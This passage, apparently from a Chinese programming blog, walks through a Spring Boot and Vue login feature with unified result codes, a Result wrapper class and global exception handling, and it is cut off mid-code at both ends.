  &lt;div style=&quot;margin: 10px 0; text-align: right&quot;&gt;\n          &lt;el-button type=&quot;primary&quot;size=&quot;small&quot; autocomplete=&quot;off&quot; @click=&quot;login&quot;&gt;登录&lt;/el-button&gt;\n          &lt;el-button type=&quot;warning&quot;size=&quot;small&quot; autocomplete=&quot;off&quot;&gt;注册&lt;/el-button&gt;\n        &lt;/div&gt;\n      &lt;/el-form&gt;\n    &lt;/div&gt;\n  &lt;/div&gt;\n&lt;/template&gt;\n\n&lt;style scoped&gt;\n.wrapper &#123;\n  height: 100vh;\n  background-image: linear-gradient(to bottom right, #FC466B, #3F5EFB);\n  overflow: hidden;\n&#125;\n&lt;/style&gt;\n</code></pre>\n<p>后端使用<strong> getOne ()<strong> 时，假设数据库中存储在</strong>脏数据</strong>（用户名相同，密码不同），导致数据无法获取</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240120104832692.png\" alt=\"image-20240120104832692\" /></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">UserDTO</span> userDTO<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token class-name\">QueryWrapper</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">User</span><span class=\"token punctuation\">></span></span> queryWrapper <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">QueryWrapper</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    queryWrapper<span class=\"token punctuation\">.</span><span class=\"token function\">eq</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">,</span>userDTO<span class=\"token punctuation\">.</span><span class=\"token function\">getUsername</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    queryWrapper<span class=\"token punctuation\">.</span><span class=\"token function\">eq</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"password\"</span><span class=\"token punctuation\">,</span>userDTO<span class=\"token punctuation\">.</span><span class=\"token function\">getPassword</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>       <span class=\"token class-name\">User</span> one <span class=\"token operator\">=</span> <span class=\"token function\">getOne</span><span class=\"token punctuation\">(</span>queryWrapper<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>       <span class=\"token keyword\">return</span> one <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>       <span class=\"token constant\">LOG</span><span class=\"token punctuation\">.</span><span class=\"token function\">error</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>       <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\">// List&lt;User> list = list(queryWrapper);</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token comment\">// return list.size() != 0;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"用户注册异常处理\"><a class=\"anchor\" href=\"#用户注册异常处理\">#</a> 用户注册 &amp; 异常处理</h1>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240120124229655.png\" alt=\"image-20240120124229655\" /></p>\n<p>封装状态码</p>\n<p>Constants.java</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>xoxbc<span class=\"token punctuation\">.</span>springboot<span class=\"token punctuation\">.</span>common</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">interface</span> <span class=\"token class-name\">Constants</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token class-name\">String</span> <span class=\"token constant\">CODE_200</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"200\"</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 成功</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token class-name\">String</span> <span class=\"token constant\">CODE_401</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"401\"</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 权限不足</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token class-name\">String</span> <span class=\"token constant\">CODE_400</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"400\"</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 参数错误</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token class-name\">String</span> <span class=\"token constant\">CODE_500</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"500\"</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 系统错误</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token class-name\">String</span> <span class=\"token constant\">CODE_600</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"600\"</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 其他业务异常</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token class-name\">String</span> <span class=\"token constant\">DICT_TYPE_ICON</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"icon\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>Result.java</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>xoxbc<span class=\"token punctuation\">.</span>springboot<span class=\"token punctuation\">.</span>common</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">lombok<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">AllArgsConstructor</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">lombok<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Data</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">lombok<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">NoArgsConstructor</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"8\"></td><td><pre> * 接口统一返回包装类</pre></td></tr><tr><td data-num=\"9\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token annotation punctuation\">@Data</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token annotation punctuation\">@NoArgsConstructor</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token annotation punctuation\">@AllArgsConstructor</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Result</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> code<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> msg<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">Object</span> data<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">Result</span> <span class=\"token function\">success</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Result</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constants</span><span class=\"token punctuation\">.</span><span class=\"token constant\">CODE_200</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">Result</span> <span class=\"token function\">success</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> data<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Result</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constants</span><span class=\"token punctuation\">.</span><span class=\"token constant\">CODE_200</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">Result</span> <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> code<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> msg<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Result</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">Result</span> <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Result</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constants</span><span class=\"token punctuation\">.</span><span class=\"token constant\">CODE_500</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"系统错误\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">Result</span> <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> msg<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Result</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constants</span><span class=\"token punctuation\">.</span><span class=\"token constant\">CODE_500</span>    <span class=\"token punctuation\">,</span> <span class=\"token string\">\"系统错误\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>注意这里 Result 类封装传输数据格式为下图所示重点</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240120233306154.png\" alt=\"image-20240120233306154\" /></p>\n<p>新建 exception/<strong>GlobalExceptionHandler.java</strong></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>xoxbc<span class=\"token punctuation\">.</span>springboot<span class=\"token punctuation\">.</span>exception</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>xoxbc<span class=\"token punctuation\">.</span>springboot<span class=\"token punctuation\">.</span>common<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Result</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ControllerAdvice</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ExceptionHandler</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ResponseBody</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token annotation punctuation\">@ControllerAdvice</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">GlobalExceptionHandler</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>     * 如果抛出的的是 ServiceException，则调用该方法</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>     * @param se 业务异常</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>     * @return Result</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>     */</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token annotation punctuation\">@ExceptionHandler</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ServiceException</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token annotation punctuation\">@ResponseBody</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Result</span> <span class=\"token function\">handle</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ServiceException</span> se<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token class-name\">Result</span><span class=\"token punctuation\">.</span><span class=\"token function\">error</span><span class=\"token punctuation\">(</span>se<span class=\"token punctuation\">.</span><span class=\"token function\">getCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> se<span class=\"token punctuation\">.</span><span class=\"token function\">getMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><strong>ServiceException.java</strong></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>xoxbc<span class=\"token punctuation\">.</span>springboot<span class=\"token punctuation\">.</span>exception</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">lombok<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Getter</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> * 自定义异常</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token annotation punctuation\">@Getter</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">ServiceException</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">RuntimeException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> code<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">ServiceException</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> code<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> msg<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>code <span class=\"token operator\">=</span> code<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>在 controller，service 接口类实现类中实现登录状态码返回</p>\n<p>UserController</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@PostMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/login\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">Result</span> <span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token annotation punctuation\">@RequestBody</span> <span class=\"token class-name\">UserDTO</span> userDTO<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token class-name\">String</span> username <span class=\"token operator\">=</span> userDTO<span class=\"token punctuation\">.</span><span class=\"token function\">getUsername</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token class-name\">String</span> password <span class=\"token operator\">=</span> userDTO<span class=\"token punctuation\">.</span><span class=\"token function\">getPassword</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">StrUtil</span><span class=\"token punctuation\">.</span><span class=\"token function\">isBlank</span><span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">StrUtil</span><span class=\"token punctuation\">.</span><span class=\"token function\">isBlank</span><span class=\"token punctuation\">(</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>       <span class=\"token keyword\">return</span> <span class=\"token class-name\">Result</span><span class=\"token punctuation\">.</span><span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constants</span><span class=\"token punctuation\">.</span><span class=\"token constant\">CODE_400</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"参数错误\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token class-name\">UserDTO</span> dto <span class=\"token operator\">=</span> userService<span class=\"token punctuation\">.</span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span>userDTO<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token class-name\">Result</span><span class=\"token punctuation\">.</span><span class=\"token function\">success</span><span class=\"token punctuation\">(</span>dto<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>UserServiceImpl.java</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">UserServiceImpl</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">ServiceImpl</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">UserMapper</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">></span></span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">IUserService</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">Log</span> <span class=\"token constant\">LOG</span> <span class=\"token operator\">=</span> <span class=\"token class-name\">Log</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">UserDTO</span> <span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">UserDTO</span> userDTO<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>       <span class=\"token class-name\">QueryWrapper</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">User</span><span class=\"token punctuation\">></span></span> queryWrapper <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">QueryWrapper</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>       queryWrapper<span class=\"token punctuation\">.</span><span class=\"token function\">eq</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">,</span> userDTO<span class=\"token punctuation\">.</span><span class=\"token function\">getUsername</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>       queryWrapper<span class=\"token punctuation\">.</span><span class=\"token function\">eq</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"password\"</span><span class=\"token punctuation\">,</span> userDTO<span class=\"token punctuation\">.</span><span class=\"token function\">getPassword</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>       <span class=\"token class-name\">User</span> one<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 数据库查询信息</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>       <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>          one <span class=\"token operator\">=</span> <span class=\"token function\">getOne</span><span class=\"token punctuation\">(</span>queryWrapper<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>       <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>          <span class=\"token constant\">LOG</span><span class=\"token punctuation\">.</span><span class=\"token function\">error</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>          <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ServiceException</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constants</span><span class=\"token punctuation\">.</span><span class=\"token constant\">CODE_500</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"系统错误\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>       <span class=\"token 